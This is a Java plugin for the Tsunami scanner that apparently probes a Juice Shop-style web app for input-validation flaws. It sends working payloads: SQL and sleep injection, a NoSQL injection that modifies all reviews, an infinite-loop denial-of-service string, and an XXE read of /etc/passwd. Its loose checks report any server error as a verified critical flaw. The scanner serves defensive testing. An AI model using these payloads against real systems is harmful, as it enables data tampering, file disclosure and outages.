/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.util.Timestamps;
import com.google.protobuf.ByteString;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.tsunami.common.net.http.HttpHeaders;

import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.Clock;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "ImproperinputvalidationdetectorpluginDetector",
    version = "0.1",
    description = "Detects ImproperInputValidationDetectorPlugin vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = ImproperinputvalidationdetectorpluginDetectorBootstrapModule.class)
public final class ImproperinputvalidationdetectorpluginDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public ImproperinputvalidationdetectorpluginDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Improperinputvalidationdetectorplugin Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    int vulnerabilityCount = 0;
    
    try {
        // Test 1: Provoke error with invalid endpoint
        if (testInvalidEndpoint(targetUri, networkService)) {
            vulnerabilityCount++;
        }
        
        // Test 2: Login with single quote injection
        if (testLoginInjection(targetUri, networkService)) {
            vulnerabilityCount++;
        }
        
        // Test 3: Sleep injection in product reviews
        if (testSleepInjection(targetUri, networkService)) {
            vulnerabilityCount++;
        }
        
        // Test 4: NoSQL injection in reviews
        if (testNoSQLInjection(targetUri, networkService)) {
            vulnerabilityCount++;
        }
        
        // Test 5: Remote code execution via JSON deserialization
        if (testRCEInjection(targetUri, networkService)) {
            vulnerabilityCount++;
        }
        
        // Test 6: XML External Entity (XXE) injection
        if (testXXEInjection(targetUri, networkService)) {
            vulnerabilityCount++;
        }
        
    } catch (IOException e) {
        logger.atWarning().log(
            format("Input validation test failed on '%s': %s", networkService, e.getMessage()));
        return false;
    }
    
    return vulnerabilityCount > 0;
}

private boolean testInvalidEndpoint(String targetUri, NetworkService networkService) throws IOException {
    HttpResponse response = httpClient.send(
        HttpRequest.get(targetUri + "/rest/qwertz")
            .setHeaders(HttpHeaders.builder()
                .addHeader("Accept", "application/json")
                .build())
            .build(),
        networkService);
    
    // Check for error responses that indicate improper error handling
    return response.status().code() >= 500 || 
           (response.status().code() >= 400 && 
            response.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("").contains("Error"));
}

private boolean testLoginInjection(String targetUri, NetworkService networkService) throws IOException {
    String loginPayload = "{\"email\":\"'\",\"password\":\"test\"}";
    
    HttpResponse response = httpClient.send(
        HttpRequest.post(targetUri + "/rest/user/login")
            .setHeaders(HttpHeaders.builder()
                .addHeader("Content-Type", "application/json")
                .addHeader("Accept", "application/json")
                .build())
            .setRequestBody(ByteString.copyFromUtf8(loginPayload))
            .build(),
        networkService);
    
    // Check for SQL error or improper handling of single quote
    String responseBody = response.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
    return response.status().code() >= 500 || 
           responseBody.contains("SQLITE_ERROR") || 
           responseBody.contains("syntax error") ||
           responseBody.contains("SQL");
}

private boolean testSleepInjection(String targetUri, NetworkService networkService) throws IOException {
    long startTime = System.currentTimeMillis();
    
    HttpResponse response = httpClient.send(
        HttpRequest.get(targetUri + "/rest/products/sleep(2000)/reviews")
            .setHeaders(HttpHeaders.builder()
                .addHeader("Accept", "application/json")
                .build())
            .build(),
        networkService);
    
    long endTime = System.currentTimeMillis();
    long duration = endTime - startTime;
    
    // Check if server actually slept (took more than 1.5 seconds)
    return duration > 1500;
}

private boolean testNoSQLInjection(String targetUri, NetworkService networkService) throws IOException {
    // First get a valid auth token by registering a user
    String registerPayload = "{\"email\":\"test@test.com\",\"password\":\"test123\",\"passwordRepeat\":\"test123\",\"securityQuestion\":{\"id\":1,\"question\":\"Your eldest siblings middle name?\",\"createdAt\":\"2023-01-01T00:00:00.000Z\",\"updatedAt\":\"2023-01-01T00:00:00.000Z\"},\"securityAnswer\":\"test\"}";
    
    HttpResponse registerResponse = httpClient.send(
        HttpRequest.post(targetUri + "/api/Users/")
            .setHeaders(HttpHeaders.builder()
                .addHeader("Content-Type", "application/json")
                .addHeader("Accept", "application/json")
                .build())
            .setRequestBody(ByteString.copyFromUtf8(registerPayload))
            .build(),
        networkService);
    
    if (registerResponse.status().code() != 201) {
        return false;
    }
    
    // Login to get token
    String loginPayload = "{\"email\":\"test@test.com\",\"password\":\"test123\"}";
    
    HttpResponse loginResponse = httpClient.send(
        HttpRequest.post(targetUri + "/rest/user/login")
            .setHeaders(HttpHeaders.builder()
                .addHeader("Content-Type", "application/json")
                .addHeader("Accept", "application/json")
                .build())
            .setRequestBody(ByteString.copyFromUtf8(loginPayload))
            .build(),
        networkService);
    
    if (loginResponse.status().code() != 200) {
        return false;
    }
    
    String loginBody = loginResponse.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
    Pattern tokenPattern = Pattern.compile("\"token\":\"([^\"]+)\"");
    Matcher matcher = tokenPattern.matcher(loginBody);
    
    if (!matcher.find()) {
        return false;
    }
    
    String token = matcher.group(1);
    
    // Perform NoSQL injection
    String nosqlPayload = "{ \"id\": { \"$ne\": -1 }, \"message\": \"NoSQL Injection!\" }";
    
    HttpResponse nosqlResponse = httpClient.send(
        HttpRequest.post(targetUri + "/rest/products/reviews")
            .setHeaders(HttpHeaders.builder()
                .addHeader("Content-Type", "application/json")
                .addHeader("Accept", "application/json")
                .addHeader("Authorization", "Bearer " + token)
                .build())
            .setRequestBody(ByteString.copyFromUtf8(nosqlPayload))
            .build(),
        networkService);
    
    // Check if NoSQL injection was successful (modified multiple records)
    String responseBody = nosqlResponse.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
    return nosqlResponse.status().code() == 200 && 
           (responseBody.contains("modified") || responseBody.contains("updated"));
}

private boolean testRCEInjection(String targetUri, NetworkService networkService) throws IOException {
    String rcePayload = "{\"orderLinesData\": \"(function dos() { while(true); })()\"}"; 
    
    long startTime = System.currentTimeMillis();
    
    HttpResponse response = httpClient.send(
        HttpRequest.post(targetUri + "/orders")
            .setHeaders(HttpHeaders.builder()
                .addHeader("Content-Type", "application/json")
                .addHeader("Accept", "application/json")
                .build())
            .setRequestBody(ByteString.copyFromUtf8(rcePayload))
            .build(),
        networkService);
    
    long endTime = System.currentTimeMillis();
    long duration = endTime - startTime;
    
    // Check if server timed out due to infinite loop (took more than 1.5 seconds)
    return duration > 1500 || response.status().code() == 408;
}

private boolean testXXEInjection(String targetUri, NetworkService networkService) throws IOException {
    String xxePayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><complaint><message>&xxe;</message></complaint>";
    
    long startTime = System.currentTimeMillis();
    
    HttpResponse response = httpClient.send(
        HttpRequest.post(targetUri + "/file-upload")
            .setHeaders(HttpHeaders.builder()
                .addHeader("Content-Type", "application/xml")
                .addHeader("Accept", "application/json")
                .build())
            .setRequestBody(ByteString.copyFromUtf8(xxePayload))
            .build(),
        networkService);
    
    long endTime = System.currentTimeMillis();
    long duration = endTime - startTime;
    
    String responseBody = response.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
    
    // Check for XXE indicators: timeout, file content disclosure, or 410 Gone status
    return duration > 1500 || 
           response.status().code() == 410 ||
           responseBody.contains("root:") ||
           responseBody.contains("/bin/bash");
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("IMPROPERINPUTVALIDATIONDETECTORPLUGIN_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("ImproperInputValidationDetectorPlugin Vulnerability Exposed")
                .setDescription("The application is vulnerable to ImproperInputValidationDetectorPlugin attacks.")
                .setRecommendation(
                    "Implement proper input validation, sanitization, and use parameterized queries. Disable XML external entity processing and implement proper error handling."))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("IMPROPERINPUTVALIDATIONDETECTORPLUGIN_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("ImproperInputValidationDetectorPlugin Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to ImproperInputValidationDetectorPlugin attacks.")
            .setRecommendation(
                "Implement proper input validation, sanitization, and use parameterized queries. Disable XML external entity processing and implement proper error handling.")
        .build());
  }
}